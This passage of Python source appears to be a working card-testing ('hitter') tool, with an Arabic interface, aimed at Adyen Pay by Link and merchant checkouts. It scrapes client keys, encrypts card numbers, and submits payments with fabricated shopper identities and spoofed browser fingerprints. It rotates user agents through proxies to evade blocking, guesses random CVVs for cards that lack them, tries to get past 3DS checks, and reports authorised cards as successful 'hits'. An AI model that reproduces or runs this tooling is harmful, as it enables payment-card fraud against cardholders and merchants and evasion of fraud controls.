                elif status == 404: return {'error': 'link_not_found', 'setup_status': 404}
                elif status == 200 and not sid_full: return {'error': 'session_soft_blocked', 'setup_status': 200, 'raw_body': raw_body[:300]}
                else:
                    if retry < max_retries - 1: await asyncio.sleep(0.3); continue
                    return {'error': f'setup_status_{status}', 'setup_status': status}
            except Exception as e:
                dbg("DBG PBL", f"  exception: {str(e)[:100]}")
                if retry < max_retries - 1: await asyncio.sleep(0.3); continue
                return {'error': str(e)[:80], 'setup_status': 0}
        return {'error': 'max_retries_exceeded', 'setup_status': 0}

    async def _scrape(self, session, ua: str = UA) -> dict:
        hdr = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9"}
        merchant = "Adyen Merchant"
        cfg = dict(clientKey=None, sessionId=None, sessionData=None, publicKey=None, environment=None, adyen=False, linkId=None, loadingContext=None, use_jwe=False)
        if 'adyen.link/' in self.url:
            m = re.search(r'adyen\.link/([A-Za-z0-9]{20,})', self.url)
            if m: cfg['linkId'] = m.group(1); cfg['adyen'] = True

        res = await _cc_get(session, self.url, headers=hdr, timeout=12)
        html = _cc_text(res)
        t = re.search(r'<title>([^<]+)</title>', html, re.I)
        if t:
            raw_title = t.group(1)
            if 'Pay by Link' in raw_title and ' - ' in raw_title: merchant = raw_title.split(' - ', 1)[1].strip()[:30]
            else: merchant = raw_title.split('|')[0].split(' - ')[0].strip()[:30]

        if re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', html): cfg['use_jwe'] = True
        page_cfg = _extract_config(html)
        _merge(cfg, page_cfg)
        cfg['sessionId'] = None; cfg['sessionData'] = None

        for blk in re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL):
            _merge(cfg, _extract_config(blk))
        cfg['sessionId'] = None; cfg['sessionData'] = None

        if cfg['adyen'] and not cfg.get('clientKey'):
            js_srcs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)', html)
            for js in js_srcs[:6]:
                if not js.startswith('http'): js = urljoin(self.url, js)
                try:
                    jr = await _cc_get(session, js, headers=hdr, timeout=8)
                    jt = _cc_text(jr)
                    if re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', js) or re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', jt): cfg['use_jwe'] = True
                    _merge(cfg, _extract_config(jt))
                except: continue
        cfg['sessionId'] = None; cfg['sessionData'] = None

        dbg("DBG SCRAPE", f"adyen={cfg.get('adyen')} linkId={cfg.get('linkId')}")
        dbg("DBG SCRAPE", f"ck={(cfg.get('clientKey') or 'NONE')[:24]}... env={cfg.get('environment')} jwe={cfg.get('use_jwe')}")

        if cfg.get('linkId'):
            lctx = cfg.get('loadingContext') or self._adyen_base(cfg.get('environment', 'live')) + '/'
            pbl = await self._bootstrap_pbl(session, cfg['linkId'], lctx, cfg.get('environment', 'live'), ua=ua)
            if pbl.get('error'):
                cfg['setup_error'] = pbl['error']; cfg['setup_status'] = pbl.get('setup_status', 0)
                dbg("DBG SCRAPE", f"bootstrap error: {pbl['error']}")
            else:
                _merge(cfg, pbl)
                if pbl.get('merchant'): merchant = pbl['merchant']
                if pbl.get('amount_value') is not None:
                    cfg['amount_value'] = pbl['amount_value']; cfg['amount_currency'] = pbl.get('amount_currency', 'USD')
                for pk in ('is_pbl', 'pbl_base', 'pbl_status', 'checkoutAttemptId', 'use_jwe'):
                    if pbl.get(pk): cfg[pk] = pbl[pk]
        cfg['merchant'] = merchant
        return cfg

    async def _get_config(self, session, ua: str = UA) -> dict:
        if self._base_cfg is None:
            self._base_cfg = await self._scrape(session, ua=ua)
            return self._base_cfg.copy()
        cfg = self._base_cfg.copy()
        cfg['sessionId'] = None; cfg['sessionData'] = None; cfg['checkoutAttemptId'] = None; cfg['setup_error'] = None; cfg['setup_status'] = 0
        if cfg.get('is_pbl') and cfg.get('linkId'):
            lctx = cfg.get('loadingContext') or self._adyen_base(cfg.get('environment', 'live')) + '/'
            pbl = await self._bootstrap_pbl(session, cfg['linkId'], lctx, cfg.get('environment', 'live'), ua=ua)
            if pbl.get('error'):
                cfg['setup_error'] = pbl['error']; cfg['setup_status'] = pbl.get('setup_status', 0); return cfg
            _merge(cfg, pbl)
            if pbl.get('merchant'): cfg['merchant'] = pbl['merchant']
            if pbl.get('amount_value') is not None:
                cfg['amount_value'] = pbl['amount_value']; cfg['amount_currency'] = pbl.get('amount_currency', 'USD')
        return cfg

    async def _fetch_pubkey(self, session, client_key: str, env: str) -> Optional[str]:
        if self._cached_pk: return self._cached_pk
        for ver in ('v1', 'v2'):
            url = f"{self._adyen_base(env)}/{ver}/clientKeys/{client_key}"
            try:
                r = await _cc_get(session, url, timeout=8)
                d = _cc_json(r)
                if isinstance(d, dict) and d.get('publicKey'):
                    self._cached_pk = d['publicKey']; return d['publicKey']
            except: pass
        return None

    def _shopper_fields(self, profile) -> dict:
        if profile is not None:
            return {'first_name': profile.first, 'last_name': profile.last, 'full_name': profile.full_name, 'email': profile.email,
                'phone': profile.phone, 'street': profile.street, 'house_number': profile.house_number, 'city': profile.city, 'state': profile.state, 'postal_code': profile.zip, 'country': profile.country}
        return _generate_random_shopper()

    async def _pay_session(self, session, encrypted: dict, sid: str, sdata: str, ck: str, env: str, ua: str, att_id: Optional[str] = None, card_num: Optional[str] = None, profile: Optional[ShopperProfile] = None) -> dict:
        dbg("DBG PAY", f"sid={sid[:20]}... sdata_len={len(sdata)} ck={ck[:24]}...")
        url = f"{self._adyen_base(env)}/v1/sessions/{sid}/payments?clientKey={ck}"
        origin = self._get_origin()
        shopper = self._shopper_fields(profile)
        pm = {"type": "scheme", "holderName": shopper["full_name"], **encrypted}
        browser_info = build_browser_info(profile, ua=ua) if profile else {"acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "colorDepth": 24, "language": "en-US", "javaEnabled": False, "screenHeight": 1080, "screenWidth": 1920, "timeZoneOffset": -300, "userAgent": UA}
        body = {"sessionData": sdata, "paymentMethod": pm, "clientStateDataIndicator": True, "browserInfo": browser_info, "channel": "Web", "origin": origin}
        if att_id: body["checkoutAttemptId"] = att_id
        if profile:
            body["shopperEmail"] = shopper["email"]
            body["shopperName"] = {"firstName": shopper["first_name"], "lastName": shopper["last_name"]}
            body["telephoneNumber"] = shopper["phone"]
            body["billingAddress"] = {"city": shopper["city"], "country": shopper["country"], "houseNumberOrName": shopper["house_number"], "postalCode": shopper["postal_code"], "stateOrProvince": shopper["state"], "street": shopper["street"]}
            body["deliveryAddress"] = body["billingAddress"]
            fp = build_browser_fingerprint_payloads(profile, ua=ua)
            body["browserFingerprintByVersion"] = fp["browser_fingerprint_by_version"]
            body["browserProfile"] = fp["browser_profile"]
        cookie_hdr = _cc_cookies(session)
        hdr = {"Content-Type": "application/json; charset=utf-8", "Accept": "application/json", "User-Agent": ua, "Origin": origin, "Referer": self.url}
        if cookie_hdr: hdr["Cookie"] = cookie_hdr
        r = await _cc_post(session, url, json=body, headers=hdr, timeout=15)
        resp_json = _cc_json(r); status_code = _cc_status(r)
        rc_show = resp_json.get('resultCode', 'NONE')
        dbg("DBG PAY", f"status={status_code} rc={rc_show}")
        if rc_show == 'NONE' or status_code != 200: dbg("DBG PAY", f"  body[:200]={_cc_text(r)[:200]}")
        return resp_json

    async def _submit_details(self, session, sid: str, sdata: str, ck: str, env: str, details: dict, ua: str = UA) -> dict:
        pbl = (self._base_cfg or {}).get('pbl_base')
        if pbl and not sid: url = f"{pbl}/paymentDetails?clientKey={ck}"
        else: url = f"{self._adyen_base(env)}/v1/sessions/{sid}/paymentDetails?clientKey={ck}"
        origin = self._get_origin()
        body = {"sessionData": sdata, "details": details}
        cookie_hdr = _cc_cookies(session)
        hdr = {"Content-Type": "application/json; charset=utf-8", "Accept": "application/json", "User-Agent": ua, "Origin": origin, "Referer": self.url}
        if cookie_hdr: hdr["Cookie"] = cookie_hdr
        r = await _cc_post(session, url, json=body, headers=hdr, timeout=20)
        return _cc_json(r)

    def _parse(self, data: dict, result: dict) -> dict:
        if not isinstance(data, dict):
            result['error'] = 'Non-dict response'; result['decline_code'] = 'parse_error'; return result
        psp = data.get('pspReference') or (data.get('action', {}).get('pspReference') if isinstance(data.get('action'), dict) else None)
        if psp: result['psp'] = psp
        action = data.get('action')
        if isinstance(action, dict):
            if action.get('url'): result['redirect_url'] = action['url']; result['3ds_url'] = action['url']; result['receipt_url'] = action['url']
            if action.get('type'): result['action_type'] = action['type']
            if action.get('token'): result['action_token'] = action['token']
        if data.get('returnUrl'): result['receipt_url'] = data['returnUrl']
        rc = data.get('resultCode', '')
        if not rc and data.get('status'): rc = str(data.get('status'))
        if not rc and ('refusalReason' in data or 'refusalReasonCode' in data): rc = 'Refused'
        if rc == 'Authorised':
            result['success'] = True; result['decline_code'] = 'authorised'; result['error'] = 'Authorised'
            if not result.get('receipt_url'):
                if data.get('returnUrl'): result['receipt_url'] = data['returnUrl']
                elif data.get('url'): result['receipt_url'] = data['url']
                elif data.get('redirectUrl'): result['receipt_url'] = data['redirectUrl']
                elif data.get('sessionResult'): result['receipt_url'] = f"{self.url}?sessionResult={data['sessionResult']}"
                else: result['receipt_url'] = self.url
            ref = extract_stored_ref(data)
            if ref: result['stored_ref'] = ref
            return result
        if rc in ('Received', 'Pending', 'AuthenticationFinished'):
            result['success'] = False; result['pending'] = True; result['decline_code'] = 'pending'; result['error'] = f"Payment {rc}"; return result
        if rc in ('RedirectShopper', 'IdentifyShopper', 'ChallengeShopper'):
            result['decline_code'] = '3ds_required'
            act_type = action.get('type', rc) if isinstance(action, dict) else rc
            result['error'] = f"3DS ({act_type})"
            if result.get('redirect_url'): result['error'] += f" - {result['redirect_url']}"
            result['is_live'] = True; return result
        if rc == 'Refused' or 'refusalReason' in data or 'refusalReasonCode' in data:
            reason = data.get('refusalReason', 'Refused'); rcode = str(data.get('refusalReasonCode', ''))
            mapped = self.REFUSAL_CODE_MAP.get(rcode) or self.DECLINE_MAP.get(reason, reason.lower().replace(' ', '_') if reason else 'refused')
            result['decline_code'] = mapped; result['error'] = f"{reason} ({rcode})" if rcode else reason
            result['is_live'] = mapped in self.LIVE_DECLINE; return result
        if 'errorCode' in data or 'message' in data:
            msg = data.get('message') or data.get('errorCode') or 'error'; err_code = str(data.get('errorCode', 'error'))
            result['decline_code'] = err_code; result['error'] = f"{msg} ({err_code})"; result['is_live'] = False; return result
        result['decline_code'] = rc.lower() if rc else 'unknown'; result['error'] = f"Adyen: {rc or 'Unknown'}"; return result

    async def _run_core(self, sess, card: dict, result: dict, t0: float, ua: str, ccn_mode: bool = False) -> dict:
        cfg = await self._get_config(sess, ua=ua)
        ck_show = (cfg.get('clientKey') or 'NONE')[:24]; sid_show = (cfg.get('sessionId') or 'NONE')[:20]; sdata_len = len(cfg.get('sessionData') or '')
        dbg("DBG CORE", f"ck={ck_show}... sid={sid_show}... sdata_len={sdata_len}")
        dbg("DBG CORE", f"setup_status={cfg.get('setup_status')} setup_error={cfg.get('setup_error')} pbl_status={cfg.get('pbl_status')}")
        result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
        if cfg.get('amount_value') is not None:
            try:
                val = int(cfg['amount_value']); cur = cfg.get('amount_currency', 'USD'); result['amount'] = f"{cur} {val / 100:.2f}"
            except: result['amount'] = str(cfg['amount_value'])

        if not cfg.get('adyen'):
            result['error'] = "No Adyen checkout detected"; result['decline_code'] = 'no_adyen'; result['response_time'] = round(time.time() - t0, 2); return result
        if cfg.get('setup_error'):
            err = cfg['setup_error']; status = cfg.get('setup_status', 0)
            if status == 410 or 'expired' in err.lower(): result['error'] = f"PBL link expired (status={status})"; result['decline_code'] = 'link_expired'
            elif status == 404: result['error'] = f"PBL link not found (status={status})"; result['decline_code'] = 'link_not_found'
            elif status == 403: result['error'] = f"PBL rate limited (status={status})"; result['decline_code'] = 'rate_limited'
            elif status == 200 and 'soft' in err.lower(): result['error'] = f"PBL soft blocked (status={status})"; result['decline_code'] = 'link_soft_blocked'
            else: result['error'] = f"PBL setup failed: {err}"; result['decline_code'] = 'no_session'
            result['setup_status'] = status; result['response_time'] = round(time.time() - t0, 2); return result
        result['pbl_reusable'] = cfg.get('pbl_reusable', True)
        if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
            result['error'] = f"Pay by Link is {cfg['pbl_status']}"; result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower(); result['response_time'] = round(time.time() - t0, 2); return result
        ck = cfg.get('clientKey')
        if not ck:
            result['error'] = "Adyen detected but clientKey not found"; result['decline_code'] = 'no_client_key'; result['response_time'] = round(time.time() - t0, 2); return result
        env = cfg.get('environment', 'live')
        pk = cfg.get('publicKey')
        if not pk: pk = await self._fetch_pubkey(sess, ck, env)
        if not pk:
            result['error'] = f"Cannot fetch pubkey for {ck[:20]}…"; result['decline_code'] = 'no_pubkey'; result['response_time'] = round(time.time() - t0, 2); return result
        try:
            cse = AdyenCSE(pk)
            cvv = card.get('cvv')
            if ccn_mode and (not cvv or cvv == '000'):
                cvv = (f"{random.randint(1000, 9999):04d}" if str(card['card']).startswith(('34', '37')) else f"{random.randint(100, 999):03d}")
                card['cvv'] = cvv
            enc = cse.encrypt_card(card['card'], card['month'], card['year'], cvv, use_jwe=cfg.get('use_jwe', False))
        except Exception as e:
            result['error'] = f"CSE failed: {e}"; result['decline_code'] = 'cse_error'; result['response_time'] = round(time.time() - t0, 2); return result
        sid = cfg.get('sessionId'); sdata = cfg.get('sessionData')
        if not sid or not sdata:
            result['error'] = "PBL returned no session"; result['decline_code'] = 'no_session'; result['setup_status'] = cfg.get('setup_status', 0); result['response_time'] = round(time.time() - t0, 2); return result
        profile = ShopperProfile(cfg.get('countryCode') or 'US')
        data = await self._pay_session(sess, enc, sid, sdata, ck, env, ua, att_id=cfg.get('checkoutAttemptId'), card_num=card.get('card'), profile=profile)
        if not data:
            result['error'] = "Adyen /payments returned empty"; result['decline_code'] = 'no_session'; result['response_time'] = round(time.time() - t0, 2); return result
        rc = data.get('resultCode', '')
        if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
            result['3ds_attempted'] = True; result['3ds_type'] = rc
            adyen_base = self._adyen_base(env)
            async def _submit_wrapped(session, sid2, sdata2, ck2, env2, details):
                return await self._submit_details(session, sid2, sdata2, ck2, env2, details, ua=ua)
            resolved = await bypass_pipeline(sess, data, sid or '', data.get('sessionData', sdata), ck, env, _submit_wrapped, adyen_base, touch_acs=False)
            if resolved and resolved is not data:
                data = resolved; result['3ds_resolved'] = True
        result['response_time'] = round(time.time() - t0, 2)
        result['raw_response'] = data
        return self._parse(data, result)

    async def hit_ccn(self, card: dict, attempt: int, user_id: int) -> dict:
        t0 = time.time()
        result = dict(attempt=attempt, card=card, success=False, decline_code=None, response_time=0, merchant='Adyen Merchant', proxy_raw=self.proxy_str, error=None, raw_response=None, is_live=False, psp=None, ccn_mode=True)
        impersonate = _random_impersonate(); ua = _random_ua()
        dbg("DBG HIT", f"attempt={attempt} imp={impersonate} ua=...{ua[-30:]}")
        proxies = self._proxy_config()
        try:
            async with ChromeSession(impersonate=impersonate, proxies=proxies, timeout=15) as sess:
                return await self._run_core(sess, card, result, t0, ua, ccn_mode=True)
        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2); result['decline_code'] = 'exception'; result['error'] = str(ex)[:150]; return result

    async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
        t0 = time.time()
        result = dict(attempt=attempt, card=card, success=False, decline_code=None, response_time=0, merchant='Adyen Merchant', proxy_raw=self.proxy_str, error=None, raw_response=None, is_live=False, psp=None)
        impersonate = _random_impersonate(); ua = _random_ua()
        dbg("DBG HIT", f"attempt={attempt} imp={impersonate} ua=...{ua[-30:]}")
        proxies = self._proxy_config()
        try:
            async with ChromeSession(impersonate=impersonate, proxies=proxies, timeout=15) as sess:
                return await self._run_core(sess, card, result, t0, ua, ccn_mode=False)
        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2); result['decline_code'] = 'exception'; result['error'] = str(ex)[:150]; return result

# ═══════════════════════════════════════════════════════════════════════════
#  CARD LOADER / PARSER
# ═══════════════════════════════════════════════════════════════════════════
def parse_card_line(line: str) -> Optional[dict]:
    line = line.strip()
    if not line or line.startswith("#"): return None
    if "|" in line:
        parts = line.split("|")
        if len(parts) >= 4: return {"card": parts[0].strip(), "month": parts[1].strip().zfill(2), "year": parts[2].strip(), "cvv": parts[3].strip()}
        return None
    m = re.match(r"(\d{13,19})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})", line)
    if m: return {"card": m.group(1), "month": m.group(2).zfill(2), "year": m.group(3), "cvv": m.group(4)}
    return None

def load_cards_from_file(path: str) -> List[dict]:
    cards = []
    if not os.path.isfile(path): return cards
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                c = parse_card_line(line)
                if c: cards.append(c)
    except: pass
    return cards

def load_cards_interactive() -> List[dict]:
    log_info("الصق الكروت سطر لكل كرت — التنسيق: cc|mm|yy|cvv")
    log_info("اكتب END لما تخلص.")
    hr()
    cards = []
    while True:
        try: line = input(f"{C.GREY}  > {C.RESET}")
        except EOFError: break
        if line.strip().upper() in ("END", "DONE", ""): break
        c = parse_card_line(line)
        if c:
            cards.append(c); print(f"{C.GREEN}  ✓ {c['card'][:6]}…{c['card'][-4:]}|{c['month']}|{c['year']}|{c['cvv']}{C.RESET}")
        else: print(f"{C.RED}  ✗ السطر غير صالح، تم تجاهله{C.RESET}")
    return cards

# ═══════════════════════════════════════════════════════════════════════════
#  PROXY TESTER
# ═══════════════════════════════════════════════════════════════════════════
async def test_proxy(proxy_str: str) -> dict:
    parsed = parse_proxy(proxy_str)
    if not parsed: return {"success": False, "error": "تنسيق غير صالح"}
    proxies = {"http": parsed["http"], "https": parsed["https"]}
    try:
        impersonate = _random_impersonate(); ua = _random_ua(); t0 = time.time()
        async with ChromeSession(impersonate=impersonate, proxies=proxies, timeout=12) as sess:
            r = await _cc_get(sess, "http://ip-api.com/json/?fields=status,country,countryCode,query,timezone,isp", headers={"User-Agent": ua, "Accept": "application/json"})
            elapsed_ms = int((time.time() - t0) * 1000); status = _cc_status(r); d = _cc_json(r)
            if status != 200 or not isinstance(d, dict): return {"success": False, "error": f"status={status}"}
            if d.get("status") != "success": return {"success": False, "error": d.get("message", "غير معروف")}
            return {"success": True, "ip": d.get("query", ""), "country": d.get("country", ""), "country_code": d.get("countryCode", ""), "isp": d.get("isp", ""), "timezone": d.get("timezone", ""), "response_ms": elapsed_ms}
    except Exception as e:
        return {"success": False, "error": str(e)[:120]}

# ═══════════════════════════════════════════════════════════════════════════
#  INTERACTIVE TOOL
# ═══════════════════════════════════════════════════════════════════════════
def print_result(idx: int, total: int, r: dict):
    card = r.get("card", {}) or {}
    cc_full = f"{card.get('card','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}"
    dt = r.get("response_time", 0); code = r.get("decline_code") or "?"; msg = r.get("error") or ""
    if r.get("success"):
        line = (f"{C.GREEN}{C.BOLD}[HIT]{C.RESET} {C.WHITE}{idx}/{total}{C.RESET}  {C.GREEN}{cc_full}{C.RESET}  {C.GREEN}→ AUTHORISED ({dt}s){C.RESET}")
        print(line); hr("═", 68, C.GREEN)
        print(f"{C.GREEN}{C.BOLD}  ✅  تم السحب بنجاح!  {cc_full}{C.RESET}")
        if r.get("amount"): print(f"{C.GREEN}  المبلغ: {r['amount']}{C.RESET}")
        if r.get("merchant"): print(f"{C.GREEN}  المتجر: {r['merchant']}{C.RESET}")
        if r.get("receipt_url"): print(f"{C.GREEN}  الفاتورة: {r['receipt_url']}{C.RESET}")
        hr("═", 68, C.GREEN); return
    live_codes = AdyenHitter.LIVE_DECLINE
    if code in live_codes: color = C.YELLOW; tag = "LIVE"
    elif code in ("3ds_required",): color = C.MAGENTA; tag = "3DS"
    elif code in ("pending",): color = C.CYAN; tag = "PEND"
    elif code in ("rate_limited",): color = C.YELLOW; tag = "RATE"
    elif code in ("link_expired", "link_not_found", "link_closed", "link_soft_blocked"): color = C.RED; tag = "LINK"
    else: color = C.RED; tag = "DEAD"
    print(f"{color}[{tag}]{C.RESET} {C.WHITE}{idx}/{total}{C.RESET}  {C.GREY}{cc_full}{C.RESET}  {color}→ {code}{C.RESET}  {C.DIM}({dt}s) {msg[:60]}{C.RESET}")

async def run_tool(url: str, cards: List[dict], ccn_mode: bool = False, pacing: bool = True, stop_on_hit: bool = True, proxy_data: Optional[dict] = None) -> List[dict]:
    hitter = AdyenHitter(url, proxy_data=proxy_data)
    results: List[dict] = []
    log_info(f"بدء الضرب → {url}")
    if proxy_data: log_info(f"البروكسي شغال → {proxy_data.get('raw', 'N/A')[:60]}")
    log_info("وضع التصحيح مفعل (تغيير البصمة والـ UA لكل محاولة)")
    total = len(cards); hits = 0; starts = time.time(); link_dead = False; soft_block_count = 0
    for i, card in enumerate(cards, start=1):
        if pacing and i > 1: d = attempt_delay(i); await asyncio.sleep(d)
        fn = hitter.hit_ccn if ccn_mode else hitter.hit
        r = await fn(card, attempt=i, user_id=0)
        results.append(r); print_result(i, total, r)
        if r.get("success"):
            hits += 1
            if stop_on_hit: break
        code = r.get("decline_code", "")
        if code in ("link_expired", "link_not_found", "link_closed"):
            log_warn(f"الرابط ميت ({code}) — بحاجة لرابط جديد"); link_dead = True; break
        if code == "link_soft_blocked":
            soft_block_count += 1
            if soft_block_count >= 3:
                log_warn("حظر متكرر 3 مرات — Adyen تحظر هذا الـ IP أو الرابط"); log_warn("→ جرب رابط جديد وبروكسي شغال"); link_dead = True; break
        if code in ("no_adyen", "no_client_key", "no_pubkey"):
            log_warn(f"خطأ حرج — {code}"); break
    elapsed = round(time.time() - starts, 2)
    hr(); log_ok(f"انتهى — المحاولات={len(results)}  النجاح={hits}  الوقت={elapsed} ثانية")
    if hitter._sid_history:
        unique_sids = list(set(hitter._sid_history))
        print(f"\n{C.CYAN}{C.BOLD}[ملخص الجلسة]{C.RESET}")
        print(f"  إجمالي المحاولات: {hitter._setup_count}")
        print(f"  الجلسات الفريدة:  {len(unique_sids)} / {len(hitter._sid_history)}")
        if len(unique_sids) < len(hitter._sid_history): print(f"  {C.YELLOW}⚠ تم اكتشاف كاش — نفس الجلسة مستخدمة!{C.RESET}")
        else: print(f"  {C.GREEN}✓ كل الجلسات فريدة — لا يوجد كاش{C.RESET}")
        hr()
    if link_dead: log_warn("الرابط ميت — أنشئ رابط PBL جديد (وتأكد من البروكسي) وجرب مرة ثانية")
    return results

def choose_mode() -> str:
    hr(); print(f"{C.CYAN}{C.BOLD}اختر الوضع:{C.RESET}")
    print(f"  {C.GREEN}[1]{C.RESET} cc   — كروت كاملة (cc|mm|yy|cvv)")
    print(f"  {C.YELLOW}[2]{C.RESET} ccn  — كروت بدون CVV (يتم توليده)"); print()
    while True:
        ch = prompt("الوضع [1/2] (الافتراضي 1): ", C.CYAN).strip() or "1"
        if ch in ("1", "cc"): return "cc"
        if ch in ("2", "ccn"): return "ccn"
        log_err("اختيار غير صالح")

def choose_source() -> List[dict]:
    hr(); print(f"{C.CYAN}{C.BOLD}مصدر الكروت:{C.RESET}")
    print(f"  {C.GREEN}[1]{C.RESET} لصق يدوي")
    print(f"  {C.YELLOW}[2]{C.RESET} تحميل من ملف (cards.txt)"); print()
    while True:
        ch = prompt("المصدر [1/2] (الافتراضي 1): ", C.CYAN).strip() or "1"
        if ch == "1": return load_cards_interactive()
        if ch == "2":
            path = prompt("مسار الملف (الافتراضي cards.txt): ", C.CYAN).strip() or "cards.txt"
            c = load_cards_from_file(path)
            if not c: log_err(f"لا يوجد كروت صالحة في {path}"); continue
            log_ok(f"تم تحميل {len(c)} كرت من {path}"); return c
        log_err("اختيار غير صالح")

def ask_int(prompt_txt: str, default: int) -> int:
    while True:
        s = prompt(prompt_txt, C.CYAN).strip()
        if not s: return default
        try:
            v = int(s)
            if v > 0: return v
        except ValueError: pass
        log_err("أدخل رقم صحيح موجب")

def ask_yes_no(prompt_txt: str, default: bool = True) -> bool:
    s = prompt(f"{prompt_txt} [{'نعم/لا' if default else 'نعم/لا'}]: ", C.CYAN).strip().lower()
    if not s: return default
    return s in ("y", "yes", "e", "evet", "نعم")

async def ask_proxy() -> Optional[dict]:
    hr(); print(f"{C.CYAN}{C.BOLD}بروكسي (اختياري){C.RESET}")
    print(f"{C.DIM}التنسيقات المدعومة:{C.RESET}")
    print(f"  host:port")
    print(f"  host:port:user:pass")
    print(f"  user:pass@host:port")
    print(f"  user:pass:host:port")
    print(f"  http://host:port")
    print(f"  http://user:pass@host:port")
    print(f"  socks5://user:pass@host:port")
    print(f"{C.DIM}اتركه فارغاً للمتابعة بدون بروكسي.{C.RESET}"); print()
    raw = prompt("البروكسي: ", C.CYAN).strip()
    if not raw: log_warn("المتابعة بدون بروكسي"); return None
    parsed = parse_proxy(raw)
    if not parsed: log_err(f"تنسيق بروكسي غير صالح: {raw}"); return None
    log_info(f"تم التحليل → {parsed['http']}"); log_info("جاري اختبار البروكسي...")
    result = await test_proxy(raw)
    if not result.get("success"):
        log_err(f"فشل اختبار البروكسي: {result.get('error')}")
        again = ask_yes_no("تجرب بروكسي ثاني؟", default=True)
        if again: return await ask_proxy()
        log_warn("المتابعة بدون بروكسي"); return None
    print(f"{C.GREEN}[+]{C.RESET} البروكسي شغال  |  IP: {result['ip']}  الدولة: {result['country']} ({result['country_code']})  ISP: {result.get('isp', 'N/A')}  الاستجابة: {result['response_ms']}ms")
    return {"http": parsed["http"], "https": parsed["https"], "raw": raw, "ip": result["ip"], "country": result["country"], "country_code": result["country_code"]}

async def main_menu():
    while True:
        clear(); banner()
        url = ""
        while not url:
            url = prompt("رابط الدفع (adyen.link / merchant / pbl): ", C.CYAN).strip()
            if not url: log_err("الرابط لا يمكن أن يكون فارغاً")
            elif not (url.startswith("http://") or url.startswith("https://") or "adyen.link" in url or "." in url): log_err("رابط غير صالح"); url = ""
        proxy_data = await ask_proxy(); hr()
        mode = choose_mode(); ccn_mode = (mode == "ccn")
        cards = choose_source()
        if not cards:
            log_err("لم يتم تحميل كروت — العودة للقائمة"); input(f"\n{C.GREY}اضغط ENTER للمتابعة…{C.RESET}"); continue
        hr(); log_info(f"إجمالي الكروت المحملة: {len(cards)}")
        max_attempts = ask_int(f"أقصى عدد محاولات (1-{len(cards)}, الافتراضي {len(cards)}): ", default=len(cards))
        max_attempts = max(1, min(max_attempts, len(cards)))
        stop_on_hit = ask_yes_no("التوقف عند أول نجاح؟", default=True)
        pacing_on = ask_yes_no("استخدام تأخير بين المحاولات (3-4 ثواني)؟", default=True)
        hr(); print(f"{C.CYAN}{C.BOLD}ملخص:{C.RESET}")
        print(f"  الرابط     : {C.WHITE}{url}{C.RESET}")
        if proxy_data: print(f"  البروكسي   : {C.GREEN}{proxy_data['ip']} ({proxy_data['country']}){C.RESET}")
        else: print(f"  البروكسي   : {C.YELLOW}لا يوجد (قد يسبب حظر){C.RESET}")
        print(f"  الوضع      : {C.WHITE}{mode}{C.RESET}")
        print(f"  الكروت     : {C.WHITE}{len(cards)}{C.RESET}")
        print(f"  المحاولات  : {C.WHITE}{max_attempts}{C.RESET}")
        print(f"  توقف النجاح: {C.WHITE}{stop_on_hit}{C.RESET}")
        print(f"  التأخير    : {C.WHITE}{pacing_on}{C.RESET}"); hr()
        if not ask_yes_no("بدء الضرب؟", default=True):
            log_info("تم الإلغاء"); input(f"\n{C.GREY}اضغط ENTER للمتابعة…{C.RESET}"); continue
        hr(); print(f"{C.YELLOW}{C.BOLD}▶  جاري البدء…{C.RESET}"); hr()
        try:
            await run_tool(url=url, cards=cards[:max_attempts], ccn_mode=ccn_mode, pacing=pacing_on, stop_on_hit=stop_on_hit, proxy_data=proxy_data)
        except KeyboardInterrupt: log_warn("تم الإيقاف بواسطة المستخدم")
        except Exception as e: log_err(f"خطأ أثناء التشغيل: {e}")
        hr(); again = ask_yes_no("تشغيل جلسة أخرى؟", default=False)
        if not again: print(f"\n{C.MAGENTA}{C.BOLD}  مع السلامة 👋{C.RESET}\n"); return

# ═══════════════════════════════════════════════════════════════════════════
#  ENTRY
# ═══════════════════════════════════════════════════════════════════════════
def _run_cli():
    try: asyncio.run(main_menu())
    except KeyboardInterrupt: print(f"\n{C.RED}تم الإجهاض.{C.RESET}")

if __name__ == "__main__":
    if len(sys.argv) >= 2 and sys.argv[1] not in ("-i", "--interactive"):
        target_url = sys.argv[1]
        mode = sys.argv[2].lower() if len(sys.argv) > 2 else "cc"
        ccn_mode = (mode == "ccn")
        max_att = int(sys.argv[3]) if len(sys.argv) > 3 else 10
        sample_cards = [
            {"card": "4111111111111111", "month": "12", "year": "2030", "cvv": "123"},
            {"card": "5555555555554444", "month": "09", "year": "2029", "cvv": "456"},
            {"card": "4000000000000002", "month": "01", "year": "2031", "cvv": "789"},
        ][:max_att]
        async def _one():
            await run_tool(target_url, sample_cards, ccn_mode=ccn_mode, pacing=True, stop_on_hit=True, proxy_data=None)
        asyncio.run(_one())
    else:
        _run_cli()
